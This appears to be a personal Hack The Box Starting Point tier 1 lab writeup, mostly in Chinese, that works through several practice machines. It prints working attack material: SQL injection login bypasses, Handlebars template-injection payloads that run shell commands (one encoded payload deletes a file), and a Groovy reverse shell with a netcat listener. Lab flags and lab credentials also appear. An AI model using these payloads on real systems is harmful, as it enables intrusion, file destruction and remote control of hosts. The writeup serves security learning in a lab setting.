# HTB writeup - Starting Point tier1

Created time: February 13, 2022 1:49 PM
Last Edited: March 5, 2022 6:43 PM
Property: February 13, 2022 1:49 PM
Tags: HTB, Sec, tier1, writeup
URL: https://app.hackthebox.com/starting-point


---

# 🗓  Appointment (SQL Injection)

這題主要是要你利用 SQL injection 的方式跳過驗證直接登入

## Tasks

### What does PII stand for? → *`Personally identifiable information`*

### What does the OWASP Top 10 list name the classification for this vulnerability? → `A03:2021-Injection`

### What service and version are running on port 80 of the target?

```php
80/tcp open http Apache httpd 2.4.38 ((Debian))
```

![Untitled](HTB%20writeu%20673ee/Untitled.png)

### What is one luck-based method of exploiting login pages? → brute-forcing

### What is a folder called in web-application terminology? → directory

### SQL Injection

直接使用 sql injection

![Untitled](HTB%20writeu%20673ee/Untitled%201.png)

滑鼠移上去就提示我們帳號了 @@

檢查一下 stroage，很空很乾淨

![Untitled](HTB%20writeu%20673ee/Untitled%202.png)

### get flag

試試基本的 injection

```
admin' OR 1='1
```

```
username=admin%27+OR+1%3D%271&password=123
password: 123
```

![Untitled](HTB%20writeu%20673ee/Untitled%203.png)

![Untitled](HTB%20writeu%20673ee/Untitled%204.png)

```
e3d0796d002a446c0e622226f42e9672
```

### 心得

官方 writeup 是有先把 nmap, gobuster , 常見帳密組合跑一次, 都無效之後再 sql injection，不過他們使用的是更簡短的語法，先來看看 source code 和測試果

```sql
admin'#
```

```sql
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.
```

![Untitled](HTB%20writeu%20673ee/Untitled%205.png)

![Untitled](HTB%20writeu%20673ee/Untitled%206.png)

```sql
username=admin%27%23&password=123
```

為什麼用 `'#` 也可以成功呢?

我們來模擬看看

step1: 這是原本的 code

```php
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
```

step2: 如果加入 `'#` 會怎樣?  

'$username' → '$username'#'

變數結尾如果被插入 `'#` 會讓 '$username' 之後的內容被註解掉，也就是 

`#’ AND password='$password'";` 這段變成註解了

```php
$sql="SELECT * FROM users WHERE username='$username'#' AND password='$password'";
```

但 SQL 的註解只有 `--` 和 `/* */` 這兩種，因此這不是 SQL 的註解符號，而是 PHP 的

注入影響到 PHP 的變數 $sql 的內容，因此等同以下的情形:

```php
$sql="SELECT * FROM users WHERE username='admin'#' AND password='$password'";
```

這邊用 syntax 顏色標示看起來更清楚，這就是字串最後被組成的結果

```php
SELECT * FROM users WHERE username='admin'#' AND password='$password'
```

---

# 📚  Sequel (MariaDB weak password)

這題只是練習 MySQL 連線而已

```php
10.129.211.185
```

官方 writeup 介紹了其他 nmap 選項

```php
-sC: Performs a script scan using the default set of scripts. It is equivalent to --
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.

-sV: Enables version detection, which will detect what versions are running on what
port.
```

```bash
nmap -sV -p 3306 $target
```

如果只有使用 -sV 不足以判斷 mysql version，因此要加上 `sV`

![Untitled](HTB%20writeu%20673ee/Untitled%207.png)

```bash
nmap -sC -sV $target
```

就算直接指定 port 3306 也是掃描的很慢 QQ

```bash
nmap -v -sV -sC -p 3306 10.129.211.185
```

![Untitled](HTB%20writeu%20673ee/Untitled%208.png)

```bash
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 104
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, FoundRows, Support41Auth, ConnectWithDatabase, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, Speaks41ProtocolOld, LongColumnFlag, SupportsTransactions, ODBCClient, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: uV.#bGyMT=vY=bUe{]=Z
|_  Auth Plugin Name: mysql_native_password
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
```

install mysql client

在 Parrot OS 沒有內建 mysql client，因此要自行安裝，而且名稱是 `default-mysql-client`

```bash
sudo apt search mysql-client
```

```bash
sudo apt install default-mysql-client
```

接下來就連進資料庫逛逛，沒有設定密碼

```bash
mysql -u root -h $target
```

```bash
mysql -h 10.129.211.185 -u root -p
```

![Untitled](HTB%20writeu%20673ee/Untitled%209.png)

```sql
show databases;
use htb;
show tables;

```

```sql
select * from config;
```

![Untitled](HTB%20writeu%20673ee/Untitled%2010.png)

### flag

```sql
7b4bec00d1a39e3dd4e021ec3d915da8
```

[https://www.hackthebox.com/achievement/machine/929350/403](https://www.hackthebox.com/achievement/machine/929350/403)

---

# 🐊  Crocodile (FTP + PHP)

先找線索及後台路徑，登入後找到 flag

## Tasks

### What FTP code is returned to us for the "Anonymous FTP login allowed" message? → `230`

### What switch can we use with gobuster to specify we are looking for specific filetypes? → `-x`

```bash
nmap -sV $target
```

![Untitled](HTB%20writeu%20673ee/Untitled%2011.png)

```
21/tcp open ftp vsFTPd 3.0.3

80/tcp open  http
|_http-title: Smash - Bootstrap Business Template
```

ftp 可匿名登入，nmap 也幫我們列出檔案了

![Untitled](HTB%20writeu%20673ee/Untitled%2012.png)

如果要看詳細的 log，記得點 `Show detailed log`

![Untitled](HTB%20writeu%20673ee/Untitled%2013.png)

```
Status:	Connecting to 10.129.1.15:21...
Status:	Connection established, waiting for welcome message...
Response:	220 (vsFTPd 3.0.3)
Command:	AUTH TLS
Response:	530 Please login with USER and PASS.
Command:	AUTH SSL
Response:	530 Please login with USER and PASS.
Status:	Insecure server, it does not support FTP over TLS.
Command:	USER anonymous
Response:	230 Login successful.
Status:	Server does not support non-ASCII characters.
Status:	Logged in
Status:	Retrieving directory listing...
Command:	PWD
Response:	257 "/" is the current directory
Status:	Directory listing of "/" successful
```

![Untitled](HTB%20writeu%20673ee/Untitled%2014.png)

```
aron
pwnmeow
egotisticalsw
admin
```

```
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

從這邊應該可以看出，題目要我們手動或自動 try 帳密

靶機的網站應該就是接下來要去的地方，只是這邊沒有登入的頁面，那應該就是要找找看後台的路徑

![Untitled](HTB%20writeu%20673ee/Untitled%2015.png)

先手動嘗試 碰碰運氣 (官方 writeup 是使用 gobuster 去找後台登入頁面)

```
admin
admin_panel
manage
login
dashboard
...
```

![Untitled](HTB%20writeu%20673ee/Untitled%2016.png)

隨然 nmap 沒掃到 http server 版本，但通常錯誤頁面會有版本號

```
Apache/2.4.41
```

也可以用 wappalyer 查看

![Untitled](HTB%20writeu%20673ee/Untitled%2017.png)

try 到 dashboard 時就跳轉到 `login.php` 了，接下來就是用剛剛在 ftp 拿到的帳密試試看

![Untitled](HTB%20writeu%20673ee/Untitled%2018.png)

先手動 try 各組帳密，從第一組開始測發現確實沒辦法一試就中，接著從最後一組試才中，如果帳密組合有限且正常對應就可以慢慢 try，如果帳密組合是隨機對應，那只好用工具了

```
admin:rKXM59ESxesUFHAd
```

### flag

![Untitled](HTB%20writeu%20673ee/Untitled%2019.png)

```
c7110277ac44d78b6a9fff2232434d16
```

[https://www.hackthebox.com/achievement/machine/929350/404](https://www.hackthebox.com/achievement/machine/929350/404)

---

# 🔥  Ignition (PHP + WebFuzzing)

```
10.129.128.51
```

## Tasks

### What is the full URL to the Magento login page? →

![Untitled](HTB%20writeu%20673ee/Untitled%2020.png)

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Did not follow redirect to http://ignition.htb/
|_http-server-header: nginx/1.14.2
```

可以看出連到靶機的話可能會被重導 (302)

直接用瀏覽器連靶機 ip 的話會發現

![Untitled](HTB%20writeu%20673ee/Untitled%2021.png)

連 state code 都沒有

![Untitled](HTB%20writeu%20673ee/Untitled%2022.png)

換成 https 也是一樣

![Untitled](HTB%20writeu%20673ee/Untitled%2023.png)

![Untitled](HTB%20writeu%20673ee/Untitled%2024.png)

重新產生靶機也是一樣

![Untitled](HTB%20writeu%20673ee/Untitled%2025.png)

目前的情況是 nginx 會將 request 重導到無效的域名

既然不是 gTLD 而是內部域名．那也許可以試試看修改 `/etc/hosts` 

![Untitled](HTB%20writeu%20673ee/Untitled%2026.png)

終於可以正常存取頁面 (原本以為會發生無限跳轉，但 DNS 解析不等於正常訪問頁面)

![Untitled](HTB%20writeu%20673ee/Untitled%2027.png)

![Untitled](HTB%20writeu%20673ee/Untitled%2028.png)

從 logo 可以看出是常見的開源購物車系統 Magento

![Untitled](HTB%20writeu%20673ee/Untitled%2029.png)

依照慣例，猜猜看後台路徑

```
http://ignition.htb/admin
```

![Untitled](HTB%20writeu%20673ee/Untitled%2030.png)

找預設帳密的話可以用以下方式:

1. 懶人 google 一下可以發現預設帳密資訊 (要留意版本)

![Untitled](HTB%20writeu%20673ee/Untitled%2031.png)

1. 自己去下載一套來架設就知道了
2. 搜尋專案的 source code 和文件，但這邊只找到單元測試用的密碼資訊 (當然這部分還有更多地方可以找)

![Untitled](HTB%20writeu%20673ee/Untitled%2032.png)

試試看 admin:123123，果然沒辦法，而且還無法用工具 try，因為會上鎖，真是太無情了

![Untitled](HTB%20writeu%20673ee/Untitled%2033.png)

只好參考官方 writeup，他們的思路是用猜的，但是要盡量縮小範圍 (密碼限制)

word list 則是使用常用清單

Most Common Passwords 2022 - Is Yours on the List? | CyberNews
[https://cybernews.com/best-password-managers/most-common-passwords/](https://cybernews.com/best-password-managers/most-common-passwords/)

根據建立帳號頁面的提示可以知道密碼限制 (不過有些時候管理員或初始化時的密碼不會被限制)

```
Minimum length of this field must be equal or greater than 8 symbols. Leading and trailing spaces will be ignored.
```

![Untitled](HTB%20writeu%20673ee/Untitled%2034.png)

根據以上限制從常用密碼列表中過濾出以下組合

帳號則是一樣猜 admin，接下來就是慢慢 try

```
admin admin123
admin root123
admin password1
admin administrator1
admin changeme1
admin password123
admin qwerty123
admin administrator123
admin changeme123
```

### flag

```
admin:qwerty123
```

![Untitled](HTB%20writeu%20673ee/Untitled%2035.png)

```
797d6c988d9dc5865e010b9410f247e0
```

[https://www.hackthebox.com/achievement/machine/929350/405](https://www.hackthebox.com/achievement/machine/929350/405)

---

# 🚴‍♂️  Bike (Server Side Template Injection)

這題主要是讓你練習 SSTI ，因為最後可以 RCE，所以也可以把網站下載下來帶回家

```groovy
10.129.97.64
```

### recon

照慣例先掃描

```
nmap -A 10.129.97.64
```

```groovy
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 13:38 CST
Nmap scan report for 10.129.97.64
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.17 seconds
```

![Untitled](HTB%20writeu%20673ee/Untitled%2036.png)

```groovy
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/home.css">
    <title> Bike </title>
</head>
<header>

</header>

<body>
    <div id=container>
  <img
    src="images/buttons.gif"
    id="avatar">
  <div class="type-wrap">
    <span id="typed" style="white-space:pre;" class="typed"></span>
  </div>
</div>
<div id="contact">
    <h3>We can let you know once we are up and running.</h3>
    <div class="fields">
      <form id="form" method="POST" action="/">
        <input name="email" placeholder="E-mail"></input>
        <button type="submit" class="button-54" name="action" value="Submit">Submit</button>
      </form>
    </div>
    <p class="result">
    </p>
</div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="js/typed.min.js"></script>
    <script src="js/main.js"></script>
</body>

</html>
```

![Untitled](HTB%20writeu%20673ee/Untitled%2037.png)

email 欄位就是我們要開始測試的地方

![Untitled](HTB%20writeu%20673ee/Untitled%2038.png)

## template injection

### 簡單判斷是哪種 template engine

HackTricks 上有一張用來判斷 template engine 種類的參考圖

再發現 SSTI 時可以先用簡單的 payload 來測試一下

![Untitled](HTB%20writeu%20673ee/Untitled%2039.png)

也可以先試圖讓 template engine 噴錯，可以直接看到後端技術的資訊

```groovy
{{ '{ }}
```

![Untitled](HTB%20writeu%20673ee/Untitled%2040.png)

```groovy
Error: Parse error on line 1:
{{'{}}
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)
    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
    at router.post (/root/Backend/routes/handlers.js:14:16)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
```

從錯誤資訊可以得知它預期的資料型態

```groovy
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
```

以及 server side 使用的 template engine 是 handlebars

```groovy
at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
```

### payload

這篇 writeup 有詳細介紹 template injection 的原理和怎麼使用 payload

Handlebars template injection and RCE in a Shopify app
[http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

如果要弄懂的話應該要好好讀一下，如果只是要通關，就把下面的 payload 丟過去炸應該就 ok 了

從目前收集到的資訊可以知道，這是一個典型的組合: nodejs + express + handlebars

payload 最主要的目的是 require child process 並執行 whoami 指令的那段

```jsx
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URLencoded:

```jsx
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

丟過去後出現 require is not defined，why ?

![Untitled](HTB%20writeu%20673ee/Untitled%2041.png)

```jsx
eferenceError: require is not defined
    at Function.eval (eval at <anonymous> (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), <anonymous>:3:1)
    at Function.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:6:34)
    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)
    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:31)
    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)
```

```jsx
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return 7*7"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![Untitled](HTB%20writeu%20673ee/Untitled%2042.png)

```jsx
{{this.push "return 7*7"}}
```

![Untitled](HTB%20writeu%20673ee/Untitled%2043.png)

不過我們可以先試著執行看看其他內容，例如順便查一下 node version

```jsx
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.version"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![Untitled](HTB%20writeu%20673ee/Untitled%2044.png)

```jsx
We will contact you at:                e       2       [object Object]                function Function() { [native code] }         2         [object Object]                                 v10.19.0
```

### template engine in sandbox

> Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use require to load such modules, we will have to find a different way.
> 

卡關，參考官方 writeup 上的解釋，原因是沙盒的關係，所以無法使用 require or import

因此這邊的思路就是要你去思考，除了透過 require 來引入 child process lib 以執行指令之外，還有沒有別的方式也能達到相同或類似的目的

進入 nodejs 的 repl (建議用跟目標環境相同的 node 版本) ，輸入 global 會發現其實可以透過它來存取

```jsx
> global.child_press
{
  _forkChild: [Function: _forkChild],
  ChildProcess: [Function: ChildProcess],
  exec: [Function: exec],
  execFile: [Function: execFile],
  execFileSync: [Function: execFileSync],
  execSync: [Function: execSync],
  fork: [Function: fork],
  spawn: [Function: spawn],
  spawnSync: [Function: spawnSync]
}
```

![Untitled](HTB%20writeu%20673ee/Untitled%2045.png)

[Process | Node.js v17.6.0 Documentation](https://nodejs.org/api/process.html#processmainmodule)

![Untitled](HTB%20writeu%20673ee/Untitled%2046.png)

> As with require.main, process.mainModule will be undefined if there is no entry script.
> 

⚠️ 如果使用 nodejs 的 repl 是看不到 process.mainModule 這個屬性的

```jsx
console.log(process.mainModule)
```

```jsx
❯ node test.js
Module {
  id: '.',
  exports: {},
  parent: null,
  filename: '/private/tmp/test.js',
  loaded: false,
  children: [],
  paths:
   [ '/private/tmp/node_modules',
     '/private/node_modules',
     '/node_modules' ] }
```

![Untitled](HTB%20writeu%20673ee/Untitled%2047.png)

```jsx
console.log(process.mainModule.require('child_process'))
```

```jsx
node test.js
{ ChildProcess:
   { [Function: ChildProcess]
     super_:
      { [Function: EventEmitter]
        once: [Function: once],
        EventEmitter: [Circular],
        usingDomains: false,
        defaultMaxListeners: [Getter/Setter],
        init: [Function],
        listenerCount: [Function] } },
  fork: [Function: fork],
  _forkChild: [Function: _forkChild],
  exec: [Function: exec],
  execFile: [Function: execFile],
  spawn: [Function: spawn],
  spawnSync: [Function: spawnSync],
  execFileSync: [Function: execFileSync],
  execSync: [Function: execSync] }
```

![Untitled](HTB%20writeu%20673ee/Untitled%2048.png)

exec 是非同步輸出，所以會比較麻煩，在某些場景可能不會正常輸出

```jsx
require('child_process').exec("whoami", (err, stdout)=> { console.log(stdout) })
```

用 execSync 會比較方便且穩定

```jsx
require('child_process').execSync("whoami").toString()
```

```jsx
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![Untitled](HTB%20writeu%20673ee/Untitled%2049.png)

```
We will contact you at:                e       2       [object Object]                function Function() { [native code] }         2         [object Object]                                 root
```

在 template engine 的場境不需要加上 `toString()` 就能正常顯示內容

![Untitled](HTB%20writeu%20673ee/Untitled%2050.png)

```
> require('child_process').execSync("whoami")
<Buffer 75 73 65 72 0a>
> require('child_process').execSync("whoami").toString()
'user\n'
>
```

```jsx
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat ~/flag.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![Untitled](HTB%20writeu%20673ee/Untitled%2051.png)

```
We will contact you at:                e       2       [object Object]                function Function() { [native code] }         2         [object Object]                                 6b258d726d287462d60c103d0142a81c
```

### flag

```
6b258d726d287462d60c103d0142a81c
```

### Ref

SSTI (Server Side Template Injection) - HackTricks
[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
The Secret Parameter, LFR, and Potential RCE in NodeJS Apps
[https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)

---

# 🤵🏻‍♂️ Pennyworth (Weak Password)

> it is vital that you save them for later in a well-organized bookmark folder for quick access. It is highly encouraged to use well-established research in your professional activities
> 

這題主要是讓你體驗在 jenkins script console 執行 reverse shell 的過程．比較需要運氣的地方是要能夠登入或利用漏洞進入 jenkins 的管理介面．

類似的場景還有 Gitlab 這類能夠執行 CI/CD piplines, webhook 或指令的服務，因此算是蠻好的目標

## Questions

### What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?: -> `confidentiality, integrity, availability`

What is the version of the service running on port 8080?: -> Jetty 9.4.39.v20210325

What version of Jenkins is running on the target?: -> 2.289.1

### What type of script is accepted as input on the Jenkins Script Console?: -> Groovy

What would the \"String cmd\" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?: -> cmd.exe

What is a different command than \"ip a\" we could use to display our network interfaces' information on Linux?: -> ifconfig

### What switch should we use with netcat for it to use UDP transport mode?: -> -u

### What is the term used to describe making a target host initiate a connection back to the attacker host?: -> `reverse shell`

## Lab

```bash
nmap -A 10.129.75.150
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 15:57 CST
Nmap scan report for 10.129.75.150
Host is up (0.27s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE    SERVICE  VERSION
1011/tcp  filtered unknown
5800/tcp  filtered vnc-http
8080/tcp  open     http     Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
50500/tcp filtered unknown
```

```bash
http://10.129.75.150:8080
```

```bash
http://10.129.75.150:8080/login?from=%2F
```

![Untitled](HTB%20writeu%20673ee/Untitled%2052.png)

![Untitled](HTB%20writeu%20673ee/Untitled%2053.png)

![Untitled](HTB%20writeu%20673ee/Untitled%2054.png)

![Untitled](HTB%20writeu%20673ee/Untitled%2055.png)

### Script Console

這邊就是要我們執行惡意程式的地方

```bash
http://10.129.75.150:8080/script
```

### nc

要先準備好我們的 nc server，負責跟惡意程式溝通

```groovy
nc -vnlp 8000
```

### nc options to use:

```
l : Listening mode.
v : Verbose mode. Displays status messages in more detail.
n : Numeric-only IP address. No hostname resolution. DNS is not being used.
p : Port. Use to specify a particular port for listening.
```

### Reverse Shell Generator

直接從官方 writeup 上複製貼上範例可能會 syntax error

可以善用 Shell Generator 幫你產生 nc 指令和 reverse shell 

![Untitled](HTB%20writeu%20673ee/Untitled%2056.png)

Online - Reverse Shell Generator
[https://www.revshells.com/](https://www.revshells.com/)

使用 shell generator 產生好的 shell code

![Untitled](HTB%20writeu%20673ee/Untitled%2057.png)

### reverse shell payload for Groovy

```groovy
String host="{YOUR_IP}";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();
po.flush();
Thread.sleep(50);
try {p.exitValue();
break;
}catch (Exception e){}};
p.destroy();
s.close();
```

關於更多不同的 reverse shell 可參考: 

PayloadsAllTheThings/Reverse Shell [Cheatsheet.md](http://cheatsheet.md/) at master · swisskyrepo/PayloadsAllTheThings
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

基本上你可能會改的參數只有這些:

```bash
String host="{your_IP}";  # 因為是讓目標連回去你(攻擊方)的 server，所以是填入你的 ip
int port=8000;
String cmd="/bin/bash";   # 如果對方是用 windows 主機，就必須換成 cmd.exe or powershell
```

```groovy
pipeline {
  agent any
  stages {
    stage('Unit Test') { 
      steps {
        sh 'mvn clean test'
      }
    }
    stage('Deploy Standalone') { 
      steps {
        sh 'mvn deploy -P standalone'
      }
    }
    stage('Deploy AnyPoint') { 
      environment {
        ANYPOINT_CREDENTIALS = credentials('anypoint.credentials') 
      }
      steps {
        sh 'mvn deploy -P arm -Darm.target.name=local-4.0.0-ee -Danypoint.username=${ANYPOINT_CREDENTIALS_USR}  -Danypoint.password=${ANYPOINT_CREDENTIALS_PSW}' 
      }
    }
    stage('Deploy CloudHub') { 
      environment {
        ANYPOINT_CREDENTIALS = credentials('anypoint.credentials')
